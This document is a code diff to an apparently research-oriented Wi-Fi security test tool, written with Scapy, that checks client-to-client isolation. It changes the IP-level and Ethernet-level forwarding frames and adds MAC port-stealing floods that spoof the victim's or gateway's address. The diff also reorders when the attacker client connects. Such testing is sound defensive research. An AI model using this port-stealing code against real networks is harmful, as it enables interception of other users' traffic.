@@ -758,6 +758,7 @@ class Client2Client:
 		self.forward_ip = False
 		self.forward_ethernet = False
 		self.bssid_victim = None
+		self.bssid_attacker = None
 		
 
 	def stop(self):
@@ -815,15 +816,18 @@ class Client2Client:
 		if self.options.c2c_ip is not None:
 			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b"forward_ip")
-			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the gateway/router)")
+			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the attacker's gateway/router)")
+			self.sup_attacker.send_eth(p)
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.routermac)/ip/Raw(b"forward_ip")
+			log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p)} (Ethernet destination is the victim's gateway/router)")
 			self.sup_attacker.send_eth(p)
 
 		# Option two: test forwarding at the Ethernet level
 		elif self.options.c2c_eth is not None:
 			# Note: although this is still IP traffic, it is send directly to the MAC address
 			# of the reciever instead of to the MAC address of the gateway/router.
-			#ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
-			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac, type=0x0800)/Raw(b"forward_ethernet")
+			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
+			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac, type=0x0800)/ip/Raw(b"forward_ethernet")
 			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
 			for _ in range(10):
 				self.sup_attacker.send_eth(p)
@@ -832,7 +836,7 @@ class Client2Client:
 		elif self.options.c2c_port_steal is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's MAC addr. 
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
-			log(STATUS, f"Sending port stealing frames from attacker to gateway/router:       {repr(p)} (Ethernet destination is the gateway/router)")
+			log(STATUS, f"Sending port stealing frames from attacker to attacker's addr:       {repr(p)} (Ethernet destination is the attacker's addr)")
 			for _ in range(1000000):
 				self.sup_attacker.send_eth(p)
 				log(STATUS, f"Sent one port stealing frame from attacker:       {repr(p)}")
@@ -843,11 +847,11 @@ class Client2Client:
 		elif self.options.c2c_port_steal_uplink is not None:
 			# Before calling this function, self.sup_attacker.mac is already modified to victim's gateway MAC addr. 
 			p = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.mac, type=0x0800)/Raw(b"port_steal")
-			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the gateway/router)")
-			for _ in range(1000):
+			log(STATUS, f"Sending port stealing frames from attacker (gateway MAC address) to himself:       {repr(p)} (Ethernet destination is the attacker's addr)")
+			for _ in range(1000000):
 				self.sup_attacker.send_eth(p)
 				time.sleep(0.1)
-			log(STATUS, f"Finished sending 1000 uplink stealing frames.")
+			log(STATUS, f"Finished sending 1000000 uplink stealing frames.")
 
 		elif self.options.c2c_broadcast is not None:
 			ip = IP(src=self.sup_attacker.clientip, dst=self.sup_victim.clientip)/UDP(sport=53, dport=53)
@@ -942,13 +946,13 @@ class Client2Client:
 			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
 		if not self.options.poc:
 			self.sup_victim.start()
-		self.sup_attacker.start()
+		
 		if not self.options.poc:
 			self.sup_victim.scan(wait=False)
-		self.sup_attacker.scan(wait=False)
+
 		if not self.options.poc:
 			self.sup_victim.wait_scan_done()
-		self.sup_attacker.wait_scan_done()
+		
 
 		# Let both client connects
 		if not self.options.poc:
@@ -961,6 +965,10 @@ class Client2Client:
 
 		if self.options.c2c_port_steal_uplink is not None:
 			set_macaddress(self.options.c2c, self.sup_victim.routermac)
+
+		self.sup_attacker.start()
+		self.sup_attacker.scan(wait=False)
+		self.sup_attacker.wait_scan_done()
 
 		# If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
 		if self.options.other_bss:
@@ -977,6 +985,9 @@ class Client2Client:
 			log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
 			self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
 
+		data = self.sup_attacker.status()
+		self.bssid_attacker = data['bssid']
+		
 		# Let the attacker get an IP address, also
 		if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
 			self.sup_attacker.get_ip_address()
